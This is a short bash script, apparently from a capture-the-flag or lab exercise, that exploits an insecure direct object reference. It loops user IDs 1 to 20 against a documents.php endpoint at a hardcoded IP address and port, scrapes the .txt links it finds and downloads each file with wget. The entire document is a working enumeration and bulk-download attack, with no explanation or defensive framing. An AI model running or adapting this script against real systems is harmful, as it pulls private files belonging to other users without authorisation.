#!/bin/bash

url="http://83.136.252.24:40500"

for i in {1..20}; do
        for link in $(curl -s "$url/documents/documents.php?uid=$i" | grep -oP "\/*.txt"); do
                wget -q $url/$link
        done
done
